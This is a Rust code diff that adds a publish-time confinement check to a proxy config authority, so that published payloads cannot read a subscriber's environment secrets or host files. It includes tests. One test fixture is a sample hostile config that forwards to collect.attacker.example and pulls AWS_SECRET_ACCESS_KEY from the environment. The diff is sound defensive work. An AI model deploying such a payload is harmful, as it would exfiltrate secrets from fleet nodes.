@@ -245,6 +245,10 @@ pub enum PublishError {
     /// The durable store refused or could not persist the publication.
     #[error("config authority publish failed at the store: {0}")]
     Store(#[from] AuthorityStoreError),
+    /// The payload reaches for a host resource only the subscriber's own
+    /// operator may reach (WOR-2433).
+    #[error("config authority publish rejected: {0}")]
+    Confinement(String),
     /// Something that should not be reachable went wrong.
     #[error("config authority publish failed: {0}")]
     Internal(String),
@@ -264,6 +268,7 @@ impl PublishError {
             Self::Compile(_) => "compile_failed",
             Self::Construct(_) => "construct_failed",
             Self::ModelRuntime(_) => "model_runtime_invalid",
+            Self::Confinement(_) => "confinement_refused",
             Self::Signing(_) => "signing_failed",
             Self::Store(_) => "store_failed",
             Self::Internal(_) => "internal",
@@ -1055,6 +1060,28 @@ pub fn validate_publish_payload(
     if !denied.is_empty() {
         return Err(PublishError::DeniedPaths(denied));
     }
+    // `denied_paths_in` above screens the PATHS a subscriber owns. It
+    // cannot screen a VALUE, and two values reach past it: a secret
+    // reference the subscriber's own resolver reads straight off that
+    // node (`env:NAME`, `vault://env/NAME`, `file:PATH`), and a key
+    // whose value is a host path the subscriber's compiler opens and
+    // inlines. `proxy.secrets` is on the denied list precisely because a
+    // node owns its own secret backends and filesystem; this applies the
+    // same rule where the deny list could not reach, which is inside the
+    // values (WOR-2433).
+    //
+    // Screened here, at publish, with the same function the subscriber
+    // runs, so a payload cannot pass the authority and then be refused
+    // by the whole fleet at once. `${VAR}` is deliberately still
+    // allowed: naming per-node values in a fleet-wide document is the
+    // documented pattern, and the unresolved-reference report below is
+    // its existing gate.
+    sbproxy_config::check_confined_document(
+        "the published payload",
+        config_yaml,
+        &sbproxy_config::ConfinementPolicy::remote_document(),
+    )
+    .map_err(|error| PublishError::Confinement(error.to_string()))?;
     let compiled = sbproxy_config::compile_config(config_yaml)
         .map_err(|error| PublishError::Compile(format!("{error:#}")))?;
     // The deep checks live in the module constructors, not in
@@ -1870,6 +1897,73 @@ pub fn spawn(publish: Option<&ConfigAuthorityPublishConfig>) -> anyhow::Result<(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// WOR-2433. The publish gate screens values, not just paths.
+    ///
+    /// Named against `validate_publish_payload` on purpose: the confined
+    /// check being correct proves nothing about this route running it,
+    /// and this route is the one that has to refuse before a payload is
+    /// signed and served to a fleet.
+    #[test]
+    fn publish_refuses_a_payload_that_reads_a_subscribers_environment() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let payload = r#"
+origins:
+  "exfil.test":
+    action:
+      type: proxy
+      url: https://collect.attacker.example
+    authentication:
+      type: api_key
+      api_key: "env:AWS_SECRET_ACCESS_KEY"
+"#;
+        let error = validate_publish_payload(payload, dir.path())
+            .expect_err("a payload reading a subscriber's environment must be refused");
+        assert_eq!(error.code(), "confinement_refused", "{error}");
+        assert!(
+            error.to_string().contains("env:NAME"),
+            "the refusal names the form: {error}"
+        );
+    }
+
+    /// The other half: `${VAR}` is how a fleet-wide document names
+    /// per-node values, so publish must not have taken it away.
+    #[test]
+    fn publish_still_accepts_a_payload_naming_a_per_node_variable() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let payload = r#"
+origins:
+  "shared.test":
+    action:
+      type: static
+      status_code: 200
+      content_type: text/plain
+      body: "${SB_DEFINITELY_UNSET_XYZZY:-fallback}"
+"#;
+        validate_publish_payload(payload, dir.path())
+            .expect("a per-node `${VAR}` stays publishable");
+    }
+
+    /// A host path in a published payload is the filesystem twin of the
+    /// environment read above.
+    #[test]
+    fn publish_refuses_a_payload_naming_a_path_on_the_subscribers_host() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let payload = r#"
+origins:
+  "shared.test":
+    action:
+      type: static
+      status_code: 200
+      content_type: text/plain
+      body: ok
+    request_modifiers:
+      - rego_module_path: /etc/sbproxy/anything.rego
+"#;
+        let error = validate_publish_payload(payload, dir.path())
+            .expect_err("a payload naming a path on the subscriber's host must be refused");
+        assert_eq!(error.code(), "confinement_refused", "{error}");
+    }
 
     #[test]
     fn the_etag_format_matches_what_a_subscriber_sends() {
